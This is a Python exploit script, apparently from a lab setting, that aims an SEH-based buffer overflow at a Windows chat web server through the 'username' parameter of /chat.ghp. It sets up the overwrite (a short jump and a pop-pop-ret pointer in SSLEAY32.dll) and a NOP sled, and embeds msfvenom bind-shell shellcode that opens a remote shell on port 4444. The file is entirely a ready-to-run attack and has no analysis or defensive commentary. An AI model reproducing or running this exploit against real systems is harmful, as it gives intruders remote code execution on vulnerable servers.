#!/usr/bin/python 
import socket


ip = "10.0.2.6"
port = 80


nseh="\x90\x90\xeb\x0A" #jmp short 0\x0A
seh="\x13\x91\x01\x10"  #SSLEAY32.dll pointer to pop pop ret 

# msfvenom -p windows/shell_bind_tcp LHOST=10.0.2.15 LPORT=4444 -b '\x00\x0A\x0D\x20' -f python

buf =  b""
buf += b"\xbf\x9e\xaa\x50\x31\xda\xd9\xd9\x74\x24\xf4\x5d\x2b"
buf += b"\xc9\xb1\x53\x31\x7d\x12\x83\xc5\x04\x03\xe3\xa4\xb2"
buf += b"\xc4\xe7\x51\xb0\x27\x17\xa2\xd5\xae\xf2\x93\xd5\xd5"
buf += b"\x77\x83\xe5\x9e\xd5\x28\x8d\xf3\xcd\xbb\xe3\xdb\xe2"
buf += b"\x0c\x49\x3a\xcd\x8d\xe2\x7e\x4c\x0e\xf9\x52\xae\x2f"
buf += b"\x32\xa7\xaf\x68\x2f\x4a\xfd\x21\x3b\xf9\x11\x45\x71"
buf += b"\xc2\x9a\x15\x97\x42\x7f\xed\x96\x63\x2e\x65\xc1\xa3"
buf += b"\xd1\xaa\x79\xea\xc9\xaf\x44\xa4\x62\x1b\x32\x37\xa2"
buf += b"\x55\xbb\x94\x8b\x59\x4e\xe4\xcc\x5e\xb1\x93\x24\x9d"
buf += b"\x4c\xa4\xf3\xdf\x8a\x21\xe7\x78\x58\x91\xc3\x79\x8d"
buf += b"\x44\x80\x76\x7a\x02\xce\x9a\x7d\xc7\x65\xa6\xf6\xe6"
buf += b"\xa9\x2e\x4c\xcd\x6d\x6a\x16\x6c\x34\xd6\xf9\x91\x26"
buf += b"\xb9\xa6\x37\x2d\x54\xb2\x45\x6c\x31\x77\x64\x8e\xc1"
buf += b"\x1f\xff\xfd\xf3\x80\xab\x69\xb8\x49\x72\x6e\xbf\x63"
buf += b"\xc2\xe0\x3e\x8c\x33\x29\x85\xd8\x63\x41\x2c\x61\xe8"
buf += b"\x91\xd1\xb4\x85\x99\x74\x67\xb8\x64\xc6\xd7\x7c\xc6"
buf += b"\xaf\x3d\x73\x39\xcf\x3d\x59\x52\x78\xc0\x62\x4d\x25"
buf += b"\x4d\x84\x07\xc5\x1b\x1e\xbf\x27\x78\x97\x58\x57\xaa"
buf += b"\x8f\xce\x10\xbc\x08\xf1\xa0\xea\x3e\x65\x2b\xf9\xfa"
buf += b"\x94\x2c\xd4\xaa\xc1\xbb\xa2\x3a\xa0\x5a\xb2\x16\x52"
buf += b"\xfe\x21\xfd\xa2\x89\x59\xaa\xf5\xde\xac\xa3\x93\xf2"
buf += b"\x97\x1d\x81\x0e\x41\x65\x01\xd5\xb2\x68\x88\x98\x8f"
buf += b"\x4e\x9a\x64\x0f\xcb\xce\x38\x46\x85\xb8\xfe\x30\x67"
buf += b"\x12\xa9\xef\x21\xf2\x2c\xdc\xf1\x84\x30\x09\x84\x68"
buf += b"\x80\xe4\xd1\x97\x2d\x61\xd6\xe0\x53\x11\x19\x3b\xd0"
buf += b"\x21\x50\x61\x71\xaa\x3d\xf0\xc3\xb7\xbd\x2f\x07\xce"
buf += b"\x3d\xc5\xf8\x35\x5d\xac\xfd\x72\xd9\x5d\x8c\xeb\x8c"
buf += b"\x61\x23\x0b\x85"
buffer="A"* 217 + nseh +seh + "\x90"*50 + buf

req = "GET /chat.ghp?username=" + buffer + "&password=&room=1&sex=2 HTTP/1.1\r\n"
req += "User-Agent: Mozilla/4.0\r\n"
req += "Host: 10.0.2.6:80\r\n"
req += "Accept-Language: en-us\r\n"
req += "Accept-Encoding: gzip, deflate\r\n"
req += "Referer: http://10.0.2.6\r\n"
req += "Connection: Keep-Alive\r\n\r\n"


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((ip,port))
s.send(req)
s.recv(1024)
s.close()

